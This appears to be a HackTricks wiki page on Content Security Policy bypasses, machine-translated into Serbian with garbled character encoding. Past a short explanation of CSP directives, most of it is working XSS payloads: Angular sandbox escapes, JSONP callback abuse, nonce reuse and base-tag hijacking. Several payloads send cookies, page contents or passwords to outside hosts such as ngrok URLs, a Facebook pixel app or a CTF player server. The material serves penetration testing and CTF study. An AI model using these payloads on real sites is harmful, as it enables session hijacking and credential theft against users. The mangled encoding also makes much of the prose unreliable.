# Content Security Policy (CSP) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Å ta je CSP

Content Security Policy (CSP) se prepoznaje kao tehnologija pretraÅ¾ivaÄa, prvenstveno usmerena na **zaÅ¡titu od napada kao Å¡to su cross-site scripting (XSS)**. FunkcioniÅ¡e tako Å¡to definiÅ¡e i detaljno opisuje puteve i izvore sa kojih se resursi mogu sigurno uÄitati od strane pretraÅ¾ivaÄa. Ovi resursi obuhvataju niz elemenata kao Å¡to su slike, okviri i JavaScript. Na primer, politika moÅ¾e dozvoliti uÄitavanje i izvrÅ¡avanje resursa sa iste domene (self), ukljuÄujuÄ‡i inline resurse i izvrÅ¡avanje string koda putem funkcija kao Å¡to su `eval`, `setTimeout` ili `setInterval`.

Implementacija CSP se vrÅ¡i putem **odgovora zaglavlja** ili ukljuÄivanjem **meta elemenata u HTML stranicu**. U skladu sa ovom politikom, pretraÅ¾ivaÄi proaktivno sprovode ove odredbe i odmah blokiraju svaku otkrivenu povredu.

* Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Implementirano putem meta taga:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP se moÅ¾e primeniti ili pratiti koristeÄ‡i ove zaglavlja:

* `Content-Security-Policy`: Primena CSP; pregledaÄ blokira sve prekrÅ¡aje.
* `Content-Security-Policy-Report-Only`: Koristi se za praÄ‡enje; izveÅ¡tava o prekrÅ¡ajima bez blokiranja. Idealno za testiranje u pre-produkcijskim okruÅ¾enjima.

### Defining Resources

CSP ograniÄava porekla za uÄitavanje aktivnog i pasivnog sadrÅ¾aja, kontroliÅ¡uÄ‡i aspekte kao Å¡to su izvrÅ¡avanje inline JavaScript-a i koriÅ¡Ä‡enje `eval()`. Primer politike je:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktive

* **script-src**: Dozvoljava specifiÄne izvore za JavaScript, ukljuÄujuÄ‡i URL-ove, inline skripte i skripte koje pokreÄ‡u upravljaÄi dogaÄ‘aja ili XSLT stilove.
* **default-src**: Postavlja podrazumevanu politiku za preuzimanje resursa kada specifiÄne direktive za preuzimanje nisu prisutne.
* **child-src**: Specifikuje dozvoljene resurse za web radnike i sadrÅ¾aj u ugnjeÅ¾denim okvirima.
* **connect-src**: OgraniÄava URL-ove koji se mogu uÄitati koristeÄ‡i interfejse kao Å¡to su fetch, WebSocket, XMLHttpRequest.
* **frame-src**: OgraniÄava URL-ove za okvire.
* **frame-ancestors**: Specifikuje koji izvori mogu ugraditi trenutnu stranicu, primenljivo na elemente kao Å¡to su `<frame>`, `<iframe>`, `<object>`, `<embed>`, i `<applet>`.
* **img-src**: DefiniÅ¡e dozvoljene izvore za slike.
* **font-src**: Specifikuje validne izvore za fontove uÄitane koristeÄ‡i `@font-face`.
* **manifest-src**: DefiniÅ¡e dozvoljene izvore datoteka manifest aplikacije.
* **media-src**: DefiniÅ¡e dozvoljene izvore za uÄitavanje medijskih objekata.
* **object-src**: DefiniÅ¡e dozvoljene izvore za elemente `<object>`, `<embed>`, i `<applet>`.
* **base-uri**: Specifikuje dozvoljene URL-ove za uÄitavanje koristeÄ‡i `<base>` elemente.
* **form-action**: Navodi validne krajnje taÄke za slanje obrazaca.
* **plugin-types**: OgraniÄava mime tipove koje stranica moÅ¾e da pozove.
* **upgrade-insecure-requests**: UpravljaÄima pretraÅ¾ivaÄa nalaÅ¾e da prepiÅ¡u HTTP URL-ove na HTTPS.
* **sandbox**: Primena ograniÄenja sliÄnih sandbox atributu `<iframe>`.
* **report-to**: Specifikuje grupu kojoj Ä‡e izveÅ¡taj biti poslat ako se politika prekrÅ¡i.
* **worker-src**: Specifikuje validne izvore za Worker, SharedWorker, ili ServiceWorker skripte.
* **prefetch-src**: Specifikuje validne izvore za resurse koji Ä‡e biti preuzeti ili unapred preuzeti.
* **navigate-to**: OgraniÄava URL-ove na koje dokument moÅ¾e da navigira na bilo koji naÄin (a, obrazac, window.location, window.open, itd.)

### Izvori

* `*`: Dozvoljava sve URL-ove osim onih sa `data:`, `blob:`, `filesystem:` shemama.
* `'self'`: Dozvoljava uÄitavanje sa iste domene.
* `'data'`: Dozvoljava resursima da se uÄitavaju putem data sheme (npr., Base64 kodirane slike).
* `'none'`: Blokira uÄitavanje sa bilo kog izvora.
* `'unsafe-eval'`: Dozvoljava koriÅ¡Ä‡enje `eval()` i sliÄnih metoda, ne preporuÄuje se iz bezbednosnih razloga.
* `'unsafe-hashes'`: OmoguÄ‡ava specifiÄne inline upravljaÄe dogaÄ‘aja.
* `'unsafe-inline'`: Dozvoljava koriÅ¡Ä‡enje inline resursa kao Å¡to su inline `<script>` ili `<style>`, ne preporuÄuje se iz bezbednosnih razloga.
* `'nonce'`: Lista dozvoljenih inline skripti koristeÄ‡i kriptografski nonce (broj koji se koristi jednom).
* Ako imate ograniÄeno izvrÅ¡avanje JS-a, moguÄ‡e je dobiti koriÅ¡Ä‡en nonce unutar stranice sa `doc.defaultView.top.document.querySelector("[nonce]")` i zatim ga ponovo koristiti za uÄitavanje maliciozne skripte (ako se koristi strict-dynamic, bilo koji dozvoljeni izvor moÅ¾e uÄitati nove izvore pa ovo nije potrebno), kao u:

<details>

<summary>UÄitaj skriptu ponovo koristeÄ‡i nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: BeleÅ¾i skripte sa specifiÄnim sha256 heÅ¡om.
* `'strict-dynamic'`: OmoguÄ‡ava uÄitavanje skripti iz bilo kog izvora ako je beliÄena putem nonce ili heÅ¡a.
* `'host'`: Precizira odreÄ‘eni host, kao Å¡to je `example.com`.
* `https:`: OgraniÄava URL-ove na one koji koriste HTTPS.
* `blob:`: OmoguÄ‡ava uÄitavanje resursa sa Blob URL-ova (npr. Blob URL-ovi kreirani putem JavaScript-a).
* `filesystem:`: OmoguÄ‡ava uÄitavanje resursa sa datoteÄnog sistema.
* `'report-sample'`: UkljuÄuje uzorak krÅ¡eÄ‡eg koda u izveÅ¡taju o krÅ¡enju (korisno za debagovanje).
* `'strict-origin'`: SliÄno 'self' ali osigurava da nivo bezbednosti protokola izvora odgovara dokumentu (samo sigurni izvori mogu uÄitavati resurse sa sigurnih izvora).
* `'strict-origin-when-cross-origin'`: Å alje pune URL-ove prilikom pravljenja zahteva sa istog izvora, ali Å¡alje samo izvor kada je zahtev meÄ‘uzavistan.
* `'unsafe-allow-redirects'`: OmoguÄ‡ava uÄitavanje resursa koji Ä‡e odmah preusmeriti na drugi resurs. Nije preporuÄljivo jer slabi bezbednost.

## Unsafe CSP Rules

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Radni payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' putem Iframe-a

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
Ovo ne radi, za viÅ¡e informacija [**proverite ovo**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Radni payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Ako moÅ¾ete nekako da omoguÄ‡ite da **dozvoljeni JS kod kreira novi script tag** u DOM-u sa vaÅ¡im JS kodom, zato Å¡to ga dozvoljeni skript kreira, **novi script tag Ä‡e biti dozvoljen za izvrÅ¡avanje**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Radni payload:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Nedostatak object-src i default-src

{% hint style="danger" %}
**Izgleda da ovo viÅ¡e ne funkcioniÅ¡e**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Radni payloadi:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Upload fajla + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Ako moÅ¾ete da otpremite JS datoteku, moÅ¾ete zaobiÄ‡i ovaj CSP:

Radni payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
MeÄ‘utim, veoma je verovatno da server **validira otpremeljenu datoteku** i da Ä‡e vam dozvoliti da **otpremite odreÄ‘ene tipove datoteka**.

Å taviÅ¡e, Äak i ako biste mogli da otpremite **JS kod unutar** datoteke koristeÄ‡i ekstenziju koju server prihvata (kao Å¡to je: _script.png_), to neÄ‡e biti dovoljno jer neki serveri poput apache servera **biraju MIME tip datoteke na osnovu ekstenzije** i pregledaÄi poput Chrome-a Ä‡e **odbiti da izvrÅ¡e Javascript** kod unutar neÄega Å¡to bi trebalo da bude slika. "Nadamo se", postoje greÅ¡ke. Na primer, iz CTF-a sam saznao da **Apache ne prepoznaje** _**.wave**_ ekstenziju, stoga je ne servira sa **MIME tipom kao audio/\***.

Odavde, ako pronaÄ‘ete XSS i otpremu datoteka, i uspete da pronaÄ‘ete **pogreÅ¡no interpretiranu ekstenziju**, mogli biste pokuÅ¡ati da otpremite datoteku sa tom ekstenzijom i sadrÅ¾ajem skripte. Ili, ako server proverava ispravan format otpremeljene datoteke, kreirajte poliglot ([neki primeri poliglotova ovde](https://github.com/Polydet/polyglot-database)).

### Form-action

Ako nije moguÄ‡e injektovati JS, joÅ¡ uvek moÅ¾ete pokuÅ¡ati da eksfiltrirate, na primer, kredencijale **injektovanjem akcije forme** (i moÅ¾da oÄekujuÄ‡i da menadÅ¾eri lozinki automatski popune lozinke). MoÅ¾ete pronaÄ‡i [**primer u ovom izveÅ¡taju**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). TakoÄ‘e, primetite da `default-src` ne pokriva akcije formi.

### TreÄ‡e strane + ('unsafe-eval')

{% hint style="warning" %}
Za neke od sledeÄ‡ih payload-a **`unsafe-eval` Äak nije ni potreban**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
UÄitajte ranjivu verziju angulera i izvrÅ¡ite proizvoljni JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Post pokazuje da moÅ¾ete **uÄitati** sve **biblioteke** sa `cdn.cloudflare.com` (ili bilo kog drugog dozvoljenog JS biblioteka repozitorijuma), izvrÅ¡iti sve dodate funkcije iz svake biblioteke i proveriti **koje funkcije iz kojih biblioteka vraÄ‡aju `window` objekat**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS iz imena klase:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Zloupotreba google recaptcha JS koda

Prema [**ovom CTF izveÅ¡taju**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), moÅ¾ete zloupotrebiti [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) unutar CSP-a da izvrÅ¡ite proizvoljan JS kod zaobilaÅ¾enjem CSP-a:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
ViÅ¡e [**payload-a iz ovog izveÅ¡taja**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Zloupotreba www.google.com za otvoreni preusmeravanje

SledeÄ‡i URL preusmerava na example.com (iz [ovde](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Zloupotreba \*.google.com/script.google.com

MoguÄ‡e je zloupotrebiti Google Apps Script da se primi informacija na stranici unutar script.google.com. Kao Å¡to je [uraÄ‘eno u ovom izveÅ¡taju](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### TreÄ‡e strane krajnje taÄke + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariji poput ovog gde je `script-src` postavljen na `self` i odreÄ‘enu domenu koja je na beloj listi mogu se zaobiÄ‡i koriÅ¡Ä‡enjem JSONP. JSONP krajnje taÄke omoguÄ‡avaju nesigurne callback metode koje omoguÄ‡avaju napadaÄu da izvrÅ¡i XSS, radni payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **sadrÅ¾i spremne JSONP krajnje taÄke za CSP zaobilaÅ¾enje razliÄitih veb sajtova.**

Ista ranjivost Ä‡e se pojaviti ako **pouzdana krajnja taÄka sadrÅ¾i Open Redirect** jer ako je inicijalna krajnja taÄka pouzdana, preusmeravanja su pouzdana.

### Zloupotrebe treÄ‡ih strana

Kao Å¡to je opisano u [sledeÄ‡em postu](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), postoji mnogo domena treÄ‡ih strana, koje mogu biti dozvoljene negde u CSP-u, koje se mogu zloupotrebiti za ili eksfiltraciju podataka ili izvrÅ¡avanje JavaScript koda. Neki od ovih treÄ‡ih strana su:

| Entitet           | Dozvoljeni domen                               | MoguÄ‡nosti   |
| ----------------- | ---------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com              | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                  | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net              | Exec         |
| Amazon CloudFront | \*.cloudfront.net                              | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                               | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net  | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                               | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                             | Exfil, Exec  |

Ako pronaÄ‘ete bilo koji od dozvoljenih domena u CSP-u vaÅ¡eg cilja, postoji Å¡ansa da biste mogli da zaobiÄ‘ete CSP registracijom na usluzi treÄ‡e strane i, ili eksfiltrirate podatke na tu uslugu ili izvrÅ¡ite kod.

Na primer, ako pronaÄ‘ete sledeÄ‡i CSP:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
Ğ¸Ğ»Ğ¸
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
Trebalo bi da budete u moguÄ‡nosti da exfiltrirate podatke, sliÄno kao Å¡to je to oduvek raÄ‘eno sa [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). U ovom sluÄaju, pratite ove opÅ¡te korake:

1. Napravite Facebook Developer nalog ovde.
2. Napravite novu aplikaciju "Facebook Login" i izaberite "Website".
3. Idite na "Settings -> Basic" i dobijte svoj "App ID".
4. Na ciljanom sajtu sa kojeg Å¾elite da exfiltrirate podatke, moÅ¾ete exfiltrirati podatke direktno koristeÄ‡i Facebook SDK ureÄ‘aj "fbq" kroz "customEvent" i payload podataka.
5. Idite na svoj App "Event Manager" i izaberite aplikaciju koju ste kreirali (napomena: menadÅ¾er dogaÄ‘aja moÅ¾e se naÄ‡i na URL-u sliÄnom ovom: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. Izaberite karticu "Test Events" da vidite dogaÄ‘aje koji se Å¡alju sa "vaÅ¡eg" veb sajta.

Zatim, na strani Å¾rtve, izvrÅ¡ite sledeÄ‡i kod da inicijalizujete Facebook praÄ‡enje piksela da upuÄ‡uje na app-id napadaÄevog Facebook developer naloga i izdajte prilagoÄ‘eni dogaÄ‘aj poput ovog:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
Å to se tiÄe ostalih sedam treÄ‡ih strana navedenih u prethodnoj tabeli, postoji mnogo drugih naÄina na koje ih moÅ¾ete zloupotrebiti. Pogledajte prethodni [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) za dodatna objaÅ¡njenja o drugim zloupotrebama treÄ‡ih strana.

### Bypass putem RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Pored prethodno pomenutog preusmeravanja za zaobilaÅ¾enje ograniÄenja putanje, postoji joÅ¡ jedna tehnika koja se zove Relative Path Overwrite (RPO) koja se moÅ¾e koristiti na nekim serverima.

Na primer, ako CSP dozvoljava putanju `https://example.com/scripts/react/`, moÅ¾e se zaobiÄ‡i na sledeÄ‡i naÄin:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
PregledaÄ Ä‡e na kraju uÄitati `https://example.com/scripts/angular/angular.js`.

To funkcioniÅ¡e jer za pregledaÄ uÄitavate datoteku pod imenom `..%2fangular%2fangular.js` koja se nalazi pod `https://example.com/scripts/react/`, Å¡to je u skladu sa CSP.

âˆ‘, oni Ä‡e to dekodirati, efektivno traÅ¾eÄ‡i `https://example.com/scripts/react/../angular/angular.js`, Å¡to je ekvivalentno `https://example.com/scripts/angular/angular.js`.

**IskoriÅ¡Ä‡avanjem ove nekonzistentnosti u interpretaciji URL-a izmeÄ‘u pregledaÄa i servera, pravila putanje se mogu zaobiÄ‡i**.

ReÅ¡enje je da se `%2f` ne tretira kao `/` na strani servera, osiguravajuÄ‡i doslednu interpretaciju izmeÄ‘u pregledaÄa i servera kako bi se izbegao ovaj problem.

Online primer:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### IzvrÅ¡avanje JS u Iframe-ima

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### nedostaje **base-uri**

Ako je direktiva **base-uri** nedostajuÄ‡a, moÅ¾ete je zloupotrebiti da izvrÅ¡ite [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Å taviÅ¡e, ako **stranica uÄitava skriptu koristeÄ‡i relativnu putanju** (kao Å¡to je `<script src="/js/app.js">`) koristeÄ‡i **Nonce**, moÅ¾ete zloupotrebiti **base** **tag** da uÄitate skriptu sa **vaÅ¡eg servera, postignuvÅ¡i XSS.**\
Ako je ranjiva stranica uÄitana sa **httpS**, koristite httpS URL u bazi.
```html
<base href="https://www.attacker.com/">
```
### AngularJS dogaÄ‘aji

SpecifiÄna politika poznata kao Content Security Policy (CSP) moÅ¾e ograniÄiti JavaScript dogaÄ‘aje. Ipak, AngularJS uvodi prilagoÄ‘ene dogaÄ‘aje kao alternativu. Unutar dogaÄ‘aja, AngularJS pruÅ¾a jedinstveni objekat `$event`, koji se odnosi na objekat nativnog pregledaÄa. Ovaj `$event` objekat moÅ¾e se iskoristiti za zaobilaÅ¾enje CSP-a. VaÅ¾no je napomenuti da u Chrome-u, `$event/event` objekat poseduje atribut `path`, koji sadrÅ¾i niz objekata ukljuÄenih u lanac izvrÅ¡enja dogaÄ‘aja, pri Äemu je objekat `window` uvek smeÅ¡ten na kraju. Ova struktura je kljuÄna za taktike bekstva iz sandbox-a.

Usmeravanjem ovog niza na `orderBy` filter, moguÄ‡e je iterirati kroz njega, koristeÄ‡i terminalni element (objekat `window`) za aktiviranje globalne funkcije kao Å¡to je `alert()`. Prikazani kod ispod objaÅ¡njava ovaj proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ovaj deo istiÄe upotrebu `ng-focus` direktive za pokretanje dogaÄ‘aja, koristeÄ‡i `$event.path|orderBy` za manipulaciju `path` nizom, i koristeÄ‡i `window` objekat za izvrÅ¡avanje `alert()` funkcije, Äime se otkriva `document.cookie`.

**PronaÄ‘ite druge Angular zaobilaÅ¾enja na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i dozvoljena domena
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
CSP politika koja beleÅ¾i dozvoljene domene za uÄitavanje skripti u Angular JS aplikaciji moÅ¾e biti zaobiÄ‘ena kroz pozivanje callback funkcija i odreÄ‘ene ranjive klase. Dodatne informacije o ovoj tehnici mogu se naÄ‡i u detaljnom vodiÄu dostupnom na ovom [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Radni payload-ovi:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Drugi JSONP arbitrarni izvrÅ¡ni krajnji taÄki mogu se naÄ‡i [**ovde**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (neki od njih su obrisani ili ispravljeni)

### ZaobilaÅ¾enje putem preusmeravanja

Å ta se deÅ¡ava kada CSP naiÄ‘e na preusmeravanje sa servera? Ako preusmeravanje vodi ka drugom poreklu koje nije dozvoljeno, i dalje Ä‡e propasti.

MeÄ‘utim, prema opisu u [CSP specifikaciji 4.2.2.3. Putanje i preusmeravanja](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), ako preusmeravanje vodi ka drugaÄijoj putanji, moÅ¾e zaobiÄ‡i originalna ograniÄenja.

Evo jednog primera:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Ako je CSP postavljen na `https://www.google.com/a/b/c/d`, poÅ¡to se putanja uzima u obzir, skripte `/test` i `/a/test` Ä‡e biti blokirane od strane CSP-a.

MeÄ‘utim, konaÄni `http://localhost:5555/301` Ä‡e biti **preusmeren na serverskoj strani na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. PoÅ¡to je u pitanju preusmeravanje, **putanja se ne uzima u obzir**, i **skripta moÅ¾e biti uÄitana**, Äime se zaobilazi ograniÄenje putanje.

Sa ovim preusmeravanjem, Äak i ako je putanja potpuno navedena, i dalje Ä‡e biti zaobiÄ‘ena.

Stoga, najbolje reÅ¡enje je osigurati da veb sajt nema otvorene ranjivosti za preusmeravanje i da ne postoje domeni koji se mogu iskoristiti u CSP pravilima.

### ZaobilaÅ¾enje CSP-a sa viseÄ‡im oznakama

ProÄitajte [kako ovde](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; putem XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` znaÄi da moÅ¾ete izvrÅ¡iti bilo koji skript unutar koda (XSS moÅ¾e izvrÅ¡iti kod) i `img-src *` znaÄi da moÅ¾ete koristiti bilo koju sliku iz bilo kog resursa na veb stranici.

MoÅ¾ete zaobiÄ‡i ovaj CSP eksfiltrirajuÄ‡i podatke putem slika (u ovoj situaciji XSS zloupotrebljava CSRF gde stranica dostupna botu sadrÅ¾i SQLi, i izvlaÄi zastavicu putem slike):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

